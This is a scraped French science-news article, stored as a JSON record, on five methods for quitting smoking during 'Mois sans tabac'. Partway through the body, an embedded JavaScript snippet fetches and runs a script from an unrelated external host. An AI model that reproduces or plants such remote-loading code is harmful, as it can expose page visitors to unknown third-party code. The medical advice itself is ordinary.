{"title": "Mois sans tabac : cinq méthodes pour arrêter de fumer", "newspaper": "Futura Sciences", "author": "Marie-Céline Jacquier", "date_publi": "10/11/2017", "content": "En novembre, c'est le mois sans tabac ! Arrêter de fumer : voilà une bien sage décision pour réduire le risque de cancers, de maladies cardiovasculaires ou respiratoires. Mais quelles sont les méthodes qui marchent le mieux ?  Ce qu'il faut retenir L'arrêt du tabac occasionne des symptômes qui peuvent être réduits par des substituts nicotiniques. Il est important de se faire aider et d'être bien entouré pour réussir son sevrage tabagique. La cigarette électronique peut aider à réduire sa consommation de tabac. Il est difficile d'arrêter de fumer ; beaucoup échouent malgré leur bonne volonté... Entre patchs, médicaments, e-cigarette, quelles sont les méthodes les plus efficaces pour mettre toutes les chances de son côté ? 1. L'incitation financière En France, en 2020, le prix du paquet de  cigarettes  devrait atteindre les 10 euros. Dès lundi 13 novembre, il augmentera en moyenne de 30 centimes, portant les prix entre 6,50 et 7,30 euros environ. Fumer un paquet à 7 euros par jour représente un budget mensuel de plus de 200 euros : arrêter de fumer, c'est donc aussi bon pour le porte-monnaie... Mais l'incitation financière, est-ce que ça marche ?  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Des recherches ont montré que payer des gens pour arrêter de fumer pouvait fonctionner chez certains. Ainsi, une étude parue dans  New England Journal of Medicine  s'est intéressée à des programmes qui incitaient 2.500 personnes à  arrêter de fumer . Celles qui avaient une motivation financière réussissaient mieux. Un des programmes les plus efficaces consistait à payer les gens environ 690 euros pour qu'ils arrêtent de fumer : 172 euros étaient versés 14 jours après l'arrêt de la cigarette, puis 172 euros au jour 30, 172 euros à six mois et un bonus de 172 euros était versé à ceux qui avaient tenu six mois sans fumer. Les participants bénéficiaient aussi de conseils et avaient accès à des aides (patchs nicotiniques...). Globalement, ceux qui étaient payés pour arrêter de fumer réussissaient trois fois mieux à six mois que ceux qui n'avaient que le suivi traditionnel (conseil, patchs...). 2. Prévoir le jour où l'on va s'arrêter Faut-il arrêter d'un coup ou progressivement ? Une  recherche  a voulu comparer les deux méthodes et a trouvé qu'elles se valaient : soit vous arrêtez de fumer à une date que vous vous êtes fixée ; soit vous diminuez progressivement votre consommation jusqu'à une date butoir. Les substituts nicotiniques peuvent être pris en charge par l’assurance maladie, à condition d’avoir une prescription du médecin. Une boîte de 28 patchs nicotiniques coûte environ 30 euros. © RFBSIP, Fotolia                       3. Être bien entouré Dans tous les cas, il est important de se préparer et de se faire aider. Prévenez votre famille et vos amis que vous arrêtez de fumer. Entourez-vous de personnes qui ont réussi à arrêter de fumer. Évitez la compagnie de celles qui fument... Quand le manque se fera ressentir, restez occupé, relaxez-vous ou parlez-en à quelqu'un, comme le conseille le site  Tabac Info Service . Par ailleurs, une  recherche de 2015  a étudié l'influence du couple sur l'arrêt de la  cigarette  : les personnes réussissaient mieux à arrêter de fumer (avec environ 50 % de réussite) si leur partenaire ne fumait pas ; avec un partenaire qui n'arrête pas la cigarette, le fumeur n'a que 8 % de chances de réussir dans son  sevrage  tabagique... Une bonne raison de s'arrêter en couple ! 4. Médicaments et thérapies de remplacement à base de nicotine Décidez quels substituts vous allez utiliser ou pas. Pour éviter le manque  physique  lié à l'arrêt de la  nicotine , une thérapie de remplacement peut être prescrite, par exemple avec des patchs ou des comprimés. Ces substituts nicotiniques aident à surmonter les périodes de manque et les  symptômes  liés à l'arrêt du tabac (envie irrésistible de fumer, anxiété...). D'après une  revue de littérature du groupe Cochrane , l'utilisation de ces  thérapies  de remplacement augmente les chances de réussite de 50 à 70 %. Les gros fumeurs auront besoin de plus de  nicotine . L'utilisation des substituts nicotiniques avec l' antidépresseur  bupropion s'avérait particulièrement efficace. Des études suggèrent aussi que commencer les patchs avant le jour d'arrêt de la cigarette peut aider. 5. La cigarette électronique Dans un article paru cette semaine dans le  Bulletin épidémiologique hebdomadaire , l'agence Santé publique France a révélé les résultats d'une enquête sur la  cigarette électronique . Il apparaît que celle-ci aide à réduire sa consommation de tabac. En revanche, son efficacité pour arrêter totalement de fumer est plus discutable. Interview : le tabac responsable d’au moins 17 types de cancers                       Il est avéré que fumer augmente les risques de développer un cancer du poumon, mais pas seulement. Le tabac est à l’origine d’au moins seize autres cancers. Futura-Sciences a rencontré Paul Hofman, directeur du laboratoire de pathologie de Nice et chercheur pionnier dans la détection du cancer du poumon, pour en savoir plus sur les risques encourus par les fumeurs.                                       ", "theme": "sante"}